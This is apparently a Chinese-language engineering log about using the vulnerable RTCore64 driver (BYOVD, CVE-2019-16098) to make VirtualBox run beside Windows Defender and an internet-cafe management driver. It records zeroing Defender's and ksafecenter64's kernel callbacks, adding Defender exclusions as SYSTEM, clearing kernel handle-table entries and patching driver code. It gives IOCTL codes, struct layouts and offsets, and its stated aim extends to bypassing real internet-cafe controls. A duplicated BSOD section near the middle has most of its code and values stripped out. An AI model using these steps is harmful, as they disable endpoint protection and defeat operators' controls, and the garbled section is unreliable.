# VirtualBox + 云更新(YunGengXin)/WdFilter 冲突调试记录

**环境：** Windows 10 22H2 (build 19045), VirtualBox 7.2.6r172322, Ubuntu VM
**工具：** ObMaster.exe (RTCore64/CVE-2019-16098 BYOVD), VBoxHardening.log
**目标：** 让 Ubuntu VM 正常启动

> **⚠️ 更正（2026-03-26）：** 本文档早期将 `ksafecenter64.sys` 误判为金山安全（Kingsoft）产品的驱动。
> 经逆向分析确认，**ksafecenter64.sys 属于「云更新」（YunGengXin）网吧无盘管理系统**，
> 与金山安全毫无关系。文档中所有"金山"相关描述均指云更新产品。

---

## 问题概述

VBoxManage startvm 返回 exit code 1 (0x1) / 历史上出现过 0xc0000005。
VM 无法启动，VBoxHardening.log 记录失败原因。

---

## VirtualBox Hardening 机制

VBox 启动有三个 Respawn 阶段：

```
Respawn #0  → 初始启动
Respawn #1  → 自我净化 (self-purification)：扫描自身 DLL 段，
               修复与磁盘不符的内存字节，然后 spawn Respawn #2
Respawn #2  → 真正的 VM 初始进程；打开 VBoxSup 驱动，
               由 VBoxSup 做最终完整性检查
```

所有 Respawn 共享同一个 VBoxHardening.log 文件（不同 PID 写入）。

---

## 当前已加载的驱动

| 驱动 | 地址 | 备注 |
|------|------|------|
| ksafecenter64.sys | FFFFF8067C090000 | 云更新(YunGengXin) 网吧管理驱动，FSFilter Activity Monitor |
| kshutdown64.sys | FFFFF80661B30000 | 云更新关机控制驱动（当前 Stopped） |
| WdFilter.sys | FFFFF80649A10000 | Windows Defender minifilter |
| VBoxSup.sys | FFFFF80651480000 | VBox 支撑驱动 |
| vgk.sys | — | Valorant 游戏反作弊 |

---

## ObCallback 当前状态

```
[0] Process  Entry:FFFFC90D31C8EF40  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : (none)   ← WdFilter.sys — 已用 /disable 清零 Pre 指针
[1] Process  Entry:FFFFC90D371738B0  Enabled:1  Ops:CREATE
     Pre : (none)   ← ksafecenter64.sys — 已用 /disable 清零
[2] Process  Entry:FFFFC90D49195C30  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF80651495A50  VBoxSup.sys +0x15a50  ← 正常
[3] Process  Entry:FFFFC90D33147280  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF8065BE3C42C  vgk.sys +0xc42c  ← 正常
```

**注：** WdFilter 原始 Pre 指针为 `FFFFF80649A1A2A0` (WdFilter.sys+0x3a2a0)，
已被 `/disable` 清零，**尚未恢复**。

---

## Notify Routines 状态（无云更新条目）

```
LoadImage:   [0] vgk.sys  [1] WdFilter.sys+0x3ce80  [2] ahcache.sys
Process:     [0] vgk.sys  [1] WdFilter.sys+0x3ce80  [2] ahcache.sys
Thread:      [0-1] WdFilter.sys  [2] vgk.sys  [3] nvlddmkm.sys  [4] mmcss.sys
```

**结论：** ksafecenter64（云更新驱动）不在任何 Notify Routine 中。

---

## Minifilter 状态

`fltmc filters` 中无 ksafecenter 条目（即使其服务注册在 FSFilter 组）。
`fltmc unload ksafecenter` → 0x801f0013 (FILTER_NOT_FOUND)。
ksafecenter 是 legacy 内核驱动，非真正 FltMgr minifilter。

---

## Windows Defender 排除规则（已添加）

```
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes
    VirtualBoxVM.exe = 0

HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
    C:\Program Files\Oracle\VirtualBox = 0
```

用 `/runas system` 以 SYSTEM 权限写入（普通 Admin 写入失败）。

---

## 调试进展时间线

### 阶段 1：初始状态（无任何干预）

- VBoxHardening.log: **325 行**
- Respawn#1 在 WinSxS 行附近死亡
- 云更新(ksafecenter64) ObCallback (Entry[1]) 阻止了 VBox 的关键调用

### 阶段 2：禁用云更新 ObCallback (`/disable ksafecenter_addr`)

- VBoxHardening.log: **441 行**
- Respawn#1 走得更远，但仍然死亡
- 发现 ntdll.text (RVA=0x1000, 10 bytes) 被异步 hook

### 阶段 3：禁用 WdFilter ObCallback Pre (`/disable FFFFF80649A1A2A0`)

- VBoxHardening.log: **601 行**
- Respawn#1 完成 self-purification：
  - 修复 VirtualBoxVM.exe `.00cfg` 段 (0x30 bytes at 0x00007ff7eed77000)
  - 修复 VirtualBoxVM.exe `.rsrc` 段 PADDINGXXPADDING (0x490 bytes at 0x00007ff7eeda8b70)
- **Respawn#2 仍然在写任何日志前就 crash (0xc0000005)**

**根因分析：** WdFilter 的 **LoadImage notify** (WdFilter.sys+0x3ce80) 仍然活跃，
在 Respawn#2 的 ntdll.dll 被映射时注入 inline hook。VBox purification
完成后，hook 被重新注入，Respawn#2 启动即 crash。

### 阶段 4：添加 Windows Defender 排除规则

- VBoxHardening.log: **1632 行** ← 大幅进步
- **Respawn#2 成功启动并写日志！**
- WdFilter 的 LoadImage notify 检查排除列表，跳过了 VirtualBoxVM.exe 的 ntdll hook
- **新错误 (error -3738)：**

```
Found evil handle to budding VM process:
  pid=0000000000000004  h=0000000000053004
  acc=0x1fffff  attr=0x0  type=process (7)  [System]
```

---

## 当前阻塞问题：Evil Handle from System Process

**VBoxSup.sys 在 Respawn#2 做最终完整性检查时，发现 System 进程 (PID 4)
持有对 VirtualBoxVM.exe 的 PROCESS_ALL_ACCESS (0x1fffff) 句柄。**

VBox 拒绝继续启动（VERR_SUP_VP_FOUND_EVIL_HANDLE, -3738）。

### 句柄来源分析

- PID 4 = System 进程 = 内核驱动的执行上下文
- 句柄由 **ksafecenter64.sys**（云更新驱动）从内核态打开（绕过用户态 API）
- VBoxSup 的 ObCallback PreOp 不 strip 内核态打开的句柄
- 句柄值每次 Respawn#2 创建时不同（0x50bb8, 0x53004, ...）
- **逆向分析确认**：属于竞态瞬态句柄，详见下方"ksafecenter64.sys 逆向分析"节

### 尝试过的解决方案

| 方法 | 结果 |
|------|------|
| `sc stop ksafecenter` | 失败，error 1052（服务不接受 Stop 命令） |
| `sc stop kshutdown` | 已经是 Stopped 状态 |
| `fltmc unload ksafecenter` | 失败，0x801f0013 (FILTER_NOT_FOUND) |
| PowerShell `OpenProcess(PID=4, PROCESS_DUP_HANDLE)` as SYSTEM | 失败，ERROR_ACCESS_DENIED (5) |
| 搜索云更新注册表白名单 | HKLM\SOFTWARE\Kingsoft 不存在；无安装目录（当时误以为金山产品） |

### 系统进程关键地址

```
System (PID 4) EPROCESS:  0xFFFF9501BE8BA040
EPROCESS+0x570 HandleTable ptr: 0xFFFFC90D30A35C80
```

---

## 下一步方案

### 方案 A：RTCore64 走核心句柄表，清零 evil handle 条目

1. 读取 System EPROCESS.HandleTable (0xFFFFC90D30A35C80)
2. 解析 HANDLE_TABLE 结构（可能是 3 级树）：
   - handle 0x53004 → index = 0x53004/4 = 85761
   - L0_idx = 85761 % 256 = 225
   - L1_idx = (85761/256) % 256 = 79
   - L2_idx = 85761 / 65536 = 1
3. 用 RTCore64 读取各级指针，定位 handle entry
4. 清零该 entry（16 bytes：Object指针 + AccessMask等）

**风险：** ksafecenter 可能立即重新打开句柄；每次 handle 值不同需动态计算

### 方案 B：修改 ksafecenter64 start type → DISABLED，重启

```
HKLM\SYSTEM\CurrentControlSet\Services\ksafecenter → Start = 4
```

需要重启机器，但彻底解决问题。

### 方案 C：内存 patch VBoxSup.sys 的 handle 检查

定位 VBoxSup.sys (base=FFFFF80651480000) 中检查 PID=4 句柄的代码，
用 RTCore64 patch 使其跳过来自 System 进程的 handle。

**风险：** 需要逆向 VBoxSup，修改内核代码有 BSOD 风险。

### 方案 D：内存 patch ksafecenter64.sys 中打开句柄的代码

定位 ksafecenter64.sys 中调用 `ObOpenObjectByPointer`/`PsLookupProcessByProcessId`
的位置，patch 使其不打开 VirtualBoxVM.exe 的句柄。

**风险：** 需要逆向 ksafecenter64.sys（闭源）。

---

## 关键技术细节

### EPROCESS 字段偏移（Windows 10 22H2 build 19045）

| 字段 | 偏移 |
|------|------|
| UniqueProcessId | +0x440 |
| ActiveProcessLinks | +0x448 |
| HandleTable | +0x570 |
| ImageFileName | +0x5a8 |
| Protection | +0x87a |

### OB_CALLBACK_ENTRY 偏移

| 字段 | 偏移 |
|------|------|
| Enabled | +0x014 |
| PreOperation | +0x028 |
| PostOperation | +0x030 |

### RTCore64 IOCTL

- Device: `\\.\RTCore64`
- IOCTL_READ: `0x80002048`
- IOCTL_WRITE: `0x8000204c`
- Struct (48 bytes): Pad0[8] + Address[8] + Pad1[8] + Size[4] + Value[4] + Pad2[16]
- 最大单次操作：4 bytes (DWORD)；64-bit 值需两次写入

### Windows HANDLE_TABLE 结构

句柄值到表项的计算（64位 Windows）：

```
index   = handle_value >> 2
L0_idx  = index % 256          # 第0级索引（叶节点）
L1_idx  = (index / 256) % 256  # 第1级索引
L2_idx  = index / 65536        # 第2级索引（根节点）

每个表项 (HANDLE_TABLE_ENTRY): 16 bytes
  [0..7]  ObjectPointer (低3位有标志位，清零后得对象地址)
  [8..15] GrantedAccessBits 等
```

---

## 模拟环境（sim_evil_handle）

为在非 VirtualBox 环境下复现和测试 evil handle 检测逻辑，编写了两个模拟程序：

**位置：** `D:\ObMaster\test\sim_evil_handle\`

### SimKsafe.exe — 模拟 ksafecenter64.sys 行为

```
SimKsafe.exe <pid|name>
```

对目标进程调用 `OpenProcess(PROCESS_ALL_ACCESS)`，持有句柄不关闭（按 Enter 释放）。
模拟 ksafecenter64.sys 从内核态对 VirtualBoxVM.exe 开句柄的效果。

### SimVBox.exe — 模拟 VBoxSup.sys 的 evil handle 检测

```
SimVBox.exe [--once]
```

---

## BSOD 分析报告（2026-03-26）

### 三次蓝屏事件

今日共发生 3 次 BSOD，WER 报告及 Minidump 已确认。

#### BSOD 1（05:56）— STOP 0xBE

```
故障模块: RTCore64!unknown_function
STOP code: 0xBE = ATTEMPTED_WRITE_TO_READONLY_MEMORY
P2 (写入地址): 0xFFFFF80127ED31B4 = ksafecenter64.sys + 0x31B4
```

**根因：** 上个会话的 `/patch` 命令用 `Wr8` 逐字节写入 ksafecenter64 代码页。
内核代码页的 PTE 没有 Write 位（W^X 执行保护），RTCore64 直接虚拟写入时
触发 CPU 写保护 → STOP 0xBE。

---

#### BSOD 2（11:45）+ BSOD 3（12:25）— 同一 bug

```
故障模块: RTCore64!unknown_function+0x14DB
STOP code: 0x3B = SYSTEM_SERVICE_EXCEPTION
P2: 0xC0000005 = STATUS_ACCESS_VIOLATION
P3 BSOD2: 0xFFFFF80644DC14DB = RTCore64_base_1 + 0x14DB
P3 BSOD3: 0xFFFFF80176B814DB = RTCore64_base_2 + 0x14DB  (KASLR重载，偏移一致)
```

**根因：** `/safepatch` 调用 `GetMmPteBase()` → `KernelExport("MmPteBase")` 返回 0
→ `g_drv->Rd64(0)` 让 RTCore64 读内核地址 0 → ACCESS_VIOLATION → STOP 0x3B。

调用链：

```
GetMmPteBase()
  -> KUtil::KernelExport("MmPteBase")
       -> LoadLibraryW("ntoskrnl.exe")   返回 NULL（OS 拦截，error 2）
       -> return 0;                      不做 null 检查直接返回 0
  -> g_drv->Rd64(0)                      RTCore64 读地址 0 -> AV -> BSOD
```

---

### 根因分析

#### 问题 1：LoadLibraryW 加载 ntoskrnl.exe 被拦截

Windows 10 故意对 ntoskrnl.exe 返回 ERROR_FILE_NOT_FOUND (error 2)，
即使文件位于 C:\Windows\System32\ 并且确实存在。
`LoadLibraryExW` 加任何 flag 同样失败（测试了 LOAD_LIBRARY_AS_IMAGE_RESOURCE / LOAD_LIBRARY_AS_DATAFILE）。

**修复（已提交）：** `kutil.cpp` 改用 `CreateFile` + 手动解析 PE 导出表（`ParseExport` 函数），
完全绕过 LoadLibrary。

#### 问题 2：MmPteBase 不在 ntoskrnl.exe 导出表

尽管文档记载 Windows 10 RS3 (build 16299) 起导出 `MmPteBase`，
但在 **build 19045 (22H2)** 上，ntoskrnl.exe 的 Export Directory（3070 个条目）
**不含 MmPteBase**，`GetProcAddress` 会返回 NULL。

#### 问题 3：MmPteBase 定位方案

扫描 ntoskrnl.exe `.text` 节所有 `MOV r64,[RIP+offset]` 指令，
统计指向 `.data` 节的引用次数：

```
.data RVA    引用次数   候选变量
0x00C124D0   1302      MmPteBase（高度疑似，比第二名高 65 倍）
0x00C01AA8   20        其他内核全局
0x00C04F48   20        其他内核全局
```

MmPteBase 全局变量 VA = ntoskrnl_base + 0xC124D0
当前系统值：0xFFFFF80639000000 + 0xC124D0 = 0xFFFFF80639C124D0（待 Rd64 验证）

---

#### BSOD 4（13:12）— STOP 0xBE（第二次只读写入）

```
故障模块: RTCore64!unknown_function
STOP code: 0xBE = ATTEMPTED_WRITE_TO_READONLY_MEMORY
P2 (写入地址): 0xFFFFF806F08C0010 = RTCore64_base + 0x10
```

**根因：** `/safepatch` 在影子页失败后回落到 `Wr32` 直接写 RTCore64 自身代码页。
代码页 PTE.Write=0 → STOP 0xBE。

**修复：** 移除 Wr32 回落路径，影子页失败时直接报错退出，不做任何内核写入。

---

#### BSOD 5（13:59）— STOP 0x50（页面错误）

```
故障模块: RTCore64!unknown_function
STOP code: 0x50 = PAGE_FAULT_IN_NONPAGED_AREA
P2 (错误地址): 0xFFFFF806F08C0010 = RTCore64_base + 0x10
P3: 0 = 读操作
P4 (崩溃 RIP): 0xFFFFF8082CCB14F6
```

**根因：** WritePte 的三步写产生了 Present=0 竞态窗口：

```
步骤1: Wr32(pteVA,   lo & ~1)  ← Present=0  ← 其他CPU执行RTCore64代码 → PAGE_FAULT
步骤2: Wr32(pteVA+4, hi_new)
步骤3: Wr32(pteVA,   lo)       ← Present=1 恢复（但已经太晚了）
```

另一个根本错误：**以 RTCore64 自身代码页为测试目标**。RTCore64 正在执行
（处理我们的 IOCTL），另一个 CPU 核必然在访问其代码 → 竞态不可避免。

**修复：**
1. WritePte 改为 hi→lo 两步写，避免 Present=0 窗口：
   - Step 1: `Wr32(pteVA+4, hi_new)` — 高位先写，PTE 仍 Present=1（旧低位）
   - Step 2: `Wr32(pteVA,   lo_new)` — 低位写入，PTE 完整更新
2. 禁止使用 RTCore64 自身地址作为 safepatch 测试目标

---

### 所有 BSOD 总结与修复状态

| # | 时间 | STOP | 地址 | 根因 | 修复状态 |
|---|------|------|------|------|----------|
| 1 | 05:56 | 0xBE | ksafecenter+0x31B4 | `/patch` Wr8 逐字节写只读页 | 已弃用 `/patch` |
| 2 | 11:45 | 0x3B | RTCore64+0x14DB | `Rd64(0)`（LoadLibrary 失败） | 已修复 ParseExport+null检查 |
| 3 | 12:25 | 0x3B | RTCore64+0x14DB | 同上 | 同上 |
| 4 | 13:12 | 0xBE | RTCore64+0x10 | safepatch Wr32 回落写只读页 | 已修复 移除Wr32回落 |
| 5 | 13:59 | 0x50 | RTCore64+0x10 | WritePte 3步写 Present=0 竞态 | 已修复 改hi→lo 2步写 |
| 6 | 2026-04-10 08:27 | 0x50 | FFFFF805CD72700C (RIP: CD9914DB) | 对 ksafecenter64 使用 `/pte`，文档已明确禁止该操作 | ⚠️ 操作违规，禁止对 ksafe 用 /pte//safepatch |
| 7 | 2026-04-10 08:38 | 0x1E | FFFFF8070DE61604（读 0x10）| BSOD 6 重启后续操作触发空指针解引用 | 待查 |

---

### 修复进度

| 修复项 | 状态 |
|--------|------|
| kutil.cpp: LoadLibrary 改为 PE 磁盘手动解析 | 已完成 |
| pte.cpp: GetMmPteBase null 检查（防止 Rd64(0)）| 已有 |
| pte.cpp: MmPteBase 签名扫描 fallback（.text 引用计数）| 已完成 |
| cmd_safepatch.cpp: 移除 Wr32 回落路径 | 已完成 |
| pte.cpp: WritePte 改 hi→lo 2步写（消除 Present=0 窗口）| 已完成 |

---

### 下一步

1. 启动 RTCore64，验证 MmPteBase 扫描输出正确值（应落在 0xFFFF????00000000）
2. 用非 RTCore64 目标测试 /safepatch 机制（如 ksafecenter64 或其他驱动）
3. 加载 ksafecenter64，执行 `/safepatch <ksafe_base+0x31B4> 33C0C390`
4. 验证 VirtualBox 不再出现 evil handle

每隔 1 秒（或 `--once` 只扫一次）：

1. 对自身调用 `OpenProcess(PROCESS_ALL_ACCESS)` 获取已知句柄值
2. 用 `NtQuerySystemInformation` class 64（`SystemExtendedHandleInformation`）拿全系统句柄快照
3. 在快照中按 **64-bit 句柄值**（无 USHORT 截断）定位自身 EPROCESS 指针和 ObjectTypeIndex
4. 扫描快照，找来自非自身/非父进程、指向同一 EPROCESS 的句柄 → 报告为 evil handle

**检测输出示例：**
```
[pass 1] Scanning...
  [!] Evil handle:
      pid=4       (System)
      h=0x57EC  acc=0x102a  type=7
  VERR_SUP_VP_FOUND_EVIL_HANDLE (-3738) — 1 handle(s)
```

### 技术要点

- **必须用 class 64**（SystemExtendedHandleInformation），class 16 的 HandleValue 是 USHORT，在 Cygwin/bash 环境下句柄值超过 0xFFFF 时匹配失败
- **必须先 OpenProcess 再拍快照**：快照是静态的，hSelf 必须已存在才能被记录进去
- **用 Object 指针匹配**，而非 DuplicateHandle（DuplicateHandle 对全系统句柄做 O(N) 调用太慢）

### 构建

```
D:\ObMaster\test\sim_evil_handle\build_sim.bat
```

使用与主项目相同的 MSVC 工具链（do_build2.bat 同款路径）。

### 逆向工具安装（WSL）

Ubuntu 22.04 apt 源的 radare2 包损坏，需通过 snap 安装：

```bash
# 安装
wsl sudo snap install radare2 --classic

# 将 /snap/bin 加入 PATH 并设 r2 别名（持久化到 ~/.bashrc）
wsl bash -c "echo 'export PATH=\"/snap/bin:\$PATH\"' >> ~/.bashrc"
wsl bash -c "echo 'alias r2=\"snap run radare2\"' >> ~/.bashrc"

# 新开 WSL session 后直接用：
wsl r2 -v
# 当前 session 临时用：
wsl snap run radare2 -v
```

**snap vs apt：**
- apt：Ubuntu/Debian 官方仓库，包放 `/usr/bin/`，直接调用
- snap：Canonical 的独立包管理，沙盒运行，包放 `/snap/bin/`；Ubuntu 22.04 apt 源的 radare2 包损坏，只能走 snap
- snap 安装的程序默认不在 PATH，需手动加 `/snap/bin` 或用 `snap run <name>`
- radare2 作者 pancake 自己维护 snap 包（当前 6.1.0），比 apt 版本更新更稳定

---

## 未解决的问题

1. **WdFilter ObCallback Pre 指针未恢复**
   原值 `FFFFF80649A1A2A0` 应写入 `FFFFC90D31C8EF68`（Entry[0] +0x028）。
   Python 无法从 bash 上下文打开 `\\.\RTCore64` (err=2)。
   需要通过 ObMaster.exe 自身完成写入。

2. **Evil handle 根本解决方案**
   ksafecenter64.sys 无法通过 SC Manager 停止，无法通过 fltmc 卸载。
   需要内核级操作（方案 A/B/C/D 之一）。

3. **ksafecenter64.sys 打开句柄的具体代码路径**
   已通过逆向分析找到，见下方"ksafecenter64.sys 逆向分析"节。

---

## ksafecenter64.sys 逆向分析（2026-03-26）

**样本来源：** 云更新 v2025.6.15.23946 客户端包（Standard_x64_..._Setup.zip → Client_x64...Setup.exe）
**文件大小：** 61608 bytes，x64 PE，编译时间 2025-08-21 11:07:29 UTC
**签名：** WHQL（Microsoft Windows Hardware Compatibility Publisher，2025-10-09 到期）
**文件位置：** `D:\ObMaster\docs\ksafecenter64.sys`

### 运行时地址（本机测试，每次开机可能不同）

```
驱动基址:   FFFFF80127ED0000
PreOp CB:   FFFFF80127ED78B8  (+0x78B8)
Ob Entry:   FFFFD10E608DD930
```

### ObRegisterCallbacks 配置

- **ObjectType**: `PsProcessType`（仅监控进程对象）
- **Operations**: `OB_OPERATION_HANDLE_CREATE`（不处理 DUPLICATE）
- **OperationRegistrationCount**: 1
- **Altitude 冲突重试**: 最多 10 次（STATUS_FLT_INSTANCE_ALTITUDE_COLLISION 时递增）
- **注册函数**: `fcn.1400074fc` @ 静态 +0x4FC

### PreOperation Callback（静态 +0x78B8）

回调在以下条件下**直接跳过（不修改权限）**：

1. 句柄是内核句柄（`Flags & OBJ_KERNEL_HANDLE`）
2. 当前 IRQL ≥ DISPATCH_LEVEL（CR8 ≥ 2）
3. 操作不是 HANDLE_CREATE（是 DUPLICATE 则跳过）
4. `OriginalDesiredAccess` 不包含 `PROCESS_TERMINATE (0x1)`
5. 目标 PID 不在保护名单中（`IsProtectedPid()` 返回 false）

满足所有条件时，剥夺以下权限位：

| 权限位 | 值 | 说明 |
|--------|-----|------|
| PROCESS_TERMINATE | 0x001 | 终止进程 |
| PROCESS_VM_OPERATION | 0x008 | 修改内存 |
| PROCESS_VM_READ | 0x010 | 读取内存 |
| PROCESS_VM_WRITE | 0x020 | 写入内存 |
| PROCESS_SUSPEND_RESUME | 0x800 | 挂起/恢复 |

### Evil Handle 来源：IsProtectedPid 内部的瞬态 Kernel Handle

ObCallback 内部调用链：

```
PreOp callback (+0x78B8)
  └─ IsProtectedPid(targetPid)  [fcn.140007600, +0x7600]
       └─ fcn.140005860(EPROCESS_ptr, ...)
            ├─ ObOpenObjectByPointer(EPROCESS, OBJ_KERNEL_HANDLE=0x200,
            │                        NULL, DesiredAccess=0, NULL,
            │                        KernelMode, &hOut)
            │   → 在 System(PID 4) 句柄表中创建 ALL_ACCESS (0x1fffff) 句柄
            ├─ ZwQueryInformationProcess(hOut, 0, ...)   // 读基本信息
            ├─ KeStackAttachProcess(EPROCESS_ptr, ...)   // 附着目标进程
            ├─ ... 读 PEB / 进程镜像名 ...
            ├─ KeUnstackDetachProcess(...)
            └─ ZwClose(hOut)   ← 关闭，但窗口期内 VBoxSup 可能已扫描到
```

**关键结论**：
- evil handle 是**竞态瞬态句柄**，非持久句柄
- 句柄在 `ObOpenObjectByPointer` → `ZwClose` 之间存在于 System 句柄表
- VBoxSup 的 `NtQuerySystemInformation` 扫描恰好落在此窗口时触发 -3738
- 每次 Respawn#2 创建时，新进程触发新的 OpenProcess → 新的 IsProtectedPid 调用 → 新句柄值

### SimVBox 实测验证

在本机加载 ksafecenter64.sys 后运行 SimVBox.exe --once 结果：

```
[pass 1] Scanning...
  [!] Evil handle:  pid=4  h=0x3CE8  acc=0x102a  [瞬态，ZwQueryInfo中间产物]
  [!] Evil handle:  pid=4  h=0x6E64  acc=0x102a  [同上]
  [!] Evil handle:  pid=4  h=0x7A0C  acc=0x1fffff  [ObOpenObjectByPointer ALL_ACCESS]
  [!] Evil handle:  pid=1012 (csrss)  h=0x124C  acc=0x1fffff  [正常 Windows 句柄]
  [!] Evil handle:  pid=9332 (conhost) h=0x2AC  acc=0x1fffff  [正常 Windows 句柄]
  VERR_SUP_VP_FOUND_EVIL_HANDLE (-3738) — 5 handle(s)
```

### 对 /evilfix 实现的影响

由于 evil handle 是瞬态的，方案 A（走句柄表清零）需要在竞态窗口内完成，可靠性低。
更可行的方案：

- **方案 D'（推荐）**：在 ksafecenter PreOp 回调入口处 patch 一个 `ret` 指令
  - 地址：运行时 `FFFFF80127ED78B8`（需每次动态查询）
  - 效果：回调永不执行，IsProtectedPid 不调用，不产生瞬态句柄
  - 已有机制：`/disable` 清零 Pre 指针效果相同，但每次重启需重新执行


---

## BSOD 分析报告（2026-03-26）

### 三次蓝屏事件

今日共发生 3 次 BSOD，WER 报告已确认。

#### BSOD #1（05:56）— STOP 0xBE


**根因：** 上个会话的  命令用  逐字节写入 ksafecenter64 代码页。  
内核代码页的 PTE 没有 Write 位（W^X 执行保护），RTCore64 直接虚拟写入时触发 CPU 保护 → STOP 0xBE。

---

#### BSOD #2（11:45）+ BSOD #3（12:25）— 同一 bug，STOP 0x3B


**根因：** ObMaster  调用 ，最终执行  → RTCore64 在内核态读地址 0 → ACCESS_VIOLATION → STOP 0x3B。

**调用链：**


---

### 根因分析

#### 问题 1：LoadLibraryW 加载 ntoskrnl.exe 被拦截

Windows 10 故意返回 ERROR_FILE_NOT_FOUND (error 2) 阻止用户态加载内核 DLL，即使文件存在。
 加所有 flag（、）同样失败。

**修复：** 改为  直接读取磁盘上的 ntoskrnl.exe 并手动解析 PE 导出表（ 函数）。

#### 问题 2：MmPteBase 不在 ntoskrnl.exe 导出表

尽管文档记载 Windows 10 RS3 (1709) 起添加了  导出，  
但在 **build 19045 (22H2)** 上， **不在 ntoskrnl.exe 的 Export Directory 中**（3070 个导出条目均不含它）。

#### 问题 3：MmPteBase 定位方法

通过扫描 ntoskrnl.exe  节中所有  指令，  
统计指向  节的引用次数，得到：

| .data RVA      | 引用次数 | 候选变量         |
|----------------|----------|-----------------|
|    | **1302** | MmPteBase ← 高度疑似 |
|    | 20       | 其他内核全局变量  |
|    | 20       | 其他内核全局变量  |

 全局变量 VA = ntoskrnl_base +   
当前系统：

---

### 修复进度

| 修复项 | 状态 |
|--------|------|
| : LoadLibrary → ParseExport（PE 磁盘解析） | ✅ 已修复 |
| : GetMmPteBase 加 null 检查 | ✅ 已有（pte.cpp 已含 null 检查） |
| : MmPteBase 不在导出表时的扫描 fallback | 🔄 进行中 |
|  在 RTCore64+0x14DB 崩溃 | ✅ 根因已定位（null check 会阻止）|

---

### 下一步

1. 完成  的签名扫描 fallback（用 .text 引用计数法）
2. 测试  不再崩溃
3. 加载 ksafecenter64，执行 
4. 验证 SimVBox / VirtualBox 不再出现 evil handle

---

## 第一次实战（2026-03-27）

### `/handle-close` 命令实现与测试

新增命令，实现两条路径：

| 目标 PID | 方法 | 原理 |
|---------|------|------|
| ≠ 4（用户态进程） | `DuplicateHandle(DUPLICATE_CLOSE_SOURCE)` | Win32 标准 API，不需要 RTCore64 |
| = 4（System 进程） | RTCore64 HANDLE_TABLE 遍历 + 清零 16 字节 | 绕过内核引用计数，直接清除表项 |

**测试结果：**

```
SimKsafe (pid=7608, h=0x9C)  → DuplicateHandle CLOSE_SOURCE → 成功
WdFilter (pid=4, h=0x7E98, ALL_ACCESS) → kernel HANDLE_TABLE walk, level=1 → 清零成功
WdFilter (pid=4, h=0x1AC0, 0x102a) → 清零成功
WdFilter (pid=4, h=0x5618, 0x102a) → 清零成功
```

SimVBox handle 数量：6→5→4→2，全部按预期下降。

---

### ksafecenter64.sys 与 VBox 实战测试

**测试场景：** `sudo sc start ksafecenter64`（服务 RUNNING），实际 VirtualBox 已打开，SimVBox 监控。

#### CreateProcess 回调确认（今日新发现）

`/notify process` 输出中，ObMaster 从早先记录的"无云更新条目"更新为：

```
[6] CreateProcess   Slot:6
     Fn : FFFFF80335DC6FAC  ksafecenter64.sys +0x6fac
```

**ksafecenter64 注册了 CreateProcess notify routine**。之前文档记录"无云更新条目"是在不同会话中测试的，当时 ksafecenter64 尚未运行。

#### 逆向：CreateProcess 回调 +0x6fac 行为分析

通过 capstone 反汇编 +0x6fac 处约 512 字节：

1. **初始化三个 UNICODE_STRING 缓冲区**（0x206/0x7f/0x206 bytes）
2. **IRQL 检查**：`mov rax, cr8` / `cmp al, 2` / `jae [exit]`，IRQL ≥ DISPATCH_LEVEL 直接退出
3. **调用 `ObOpenObjectByPointer` 系列**（0x208 = `OBJ_KERNEL_HANDLE`），打开目标进程 handle 用于查询
4. **读取 CreateInfo 的 `[rsi+8]`（FileObject）和 `[rsi+0x18]`（CreatingThreadId.UniqueProcess）**
5. **多次调用 +0x1168**（字符串搜索/比较函数，参数 `ecx=4` 疑似大小写标志）
6. 整体结构：查询新进程的镜像路径 → 与内部名单比对 → 决定是否处理

名单内容**不在 .rdata/.data 明文字符串中**（已全量提取），推测从注册表/配置文件加载或运行时动态解密。

#### import 表关键能力

| API | 用途 |
|-----|------|
| `ObRegisterCallbacks` | 拦截进程 handle 创建，保护受控进程 |
| `PsSetLoadImageNotifyRoutine` | 监控 DLL/驱动加载 |
| `FltRegisterFilter` | 文件系统过滤（但实测不是 FltMgr minifilter） |
| `CmRegisterCallbackEx` | 注册表监控 |
| `ZwQuerySystemInformation` | 系统信息查询 |
| `ObOpenObjectByPointer` | 内核态打开进程 handle（evil handle 来源） |

#### SimVBox 基线 Handle 明细（ksafecenter64 RUNNING，SimVBox PID=20024）

`SimVBox.exe --once` 实测输出：

```
[!] Evil handle:  pid=4      (System)      h=0x4BC0  acc=0x1fffff  type=7
[!] Evil handle:  pid=4      (System)      h=0x691C  acc=0x102a    type=7
[!] Evil handle:  pid=4      (System)      h=0x8114  acc=0x102a    type=7
[!] Evil handle:  pid=396    (csrss.exe)   h=0x8FC   acc=0x1fffff  type=7
[!] Evil handle:  pid=20428  (conhost.exe) h=0x234   acc=0x1fffff  type=7
VERR_SUP_VP_FOUND_EVIL_HANDLE (-3738) — 5 handle(s)
```

pid=4 的三个 handle 来自 Windows Defender 子系统驱动（均位于 `\SystemRoot\system32\drivers\wd\`）：

| 驱动 | 基址 |
|------|------|
| WdFilter.sys | FFFFF80322570000 |
| KslD.sys     | FFFFF803AB6A0000 |
| WdNisDrv.sys | FFFFF803AB700000 |

access mask 说明：
- `0x1fffff` = `PROCESS_ALL_ACCESS`
- `0x102a`   = `PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE`

csrss 和 conhost 的 ALL_ACCESS handle 是 Windows 正常行为（控制台进程管理）。

#### SimVBox 状态对比

| 状态 | handle 数 |
|------|----------|
| 干净系统（Defender 运行） | 5 |
| + SimKsafe 持有句柄 | 6 |
| SimKsafe 释放后 | 5 |
| ksafecenter64 RUNNING | **5**（无新增） |

**ksafecenter64 对 SimVBox 进程未增加任何 handle。**

---

### 未解问题：网吧环境下 VBox 无法运行

**当前结论**：在本次测试环境（家用 PC + ksafecenter64 加载），VirtualBox 可正常打开，evil handle 来源为 WdFilter（Windows Defender），与 ksafecenter64 无关。

**但用户反馈**：在真实网吧环境中，VirtualBox 无法运行。

**待研究的可能原因：**

1. **网吧环境的 ksafecenter64 版本不同**：网吧客户端可能是不同版本，配置（名单）也不同，可能主动针对 VirtualBoxVM.exe
2. **网吧另有其他驱动**：除 ksafecenter64 之外，网吧管理系统可能还有其他内核组件（如 kshutdown64.sys 或未列出的驱动）干扰 VBox
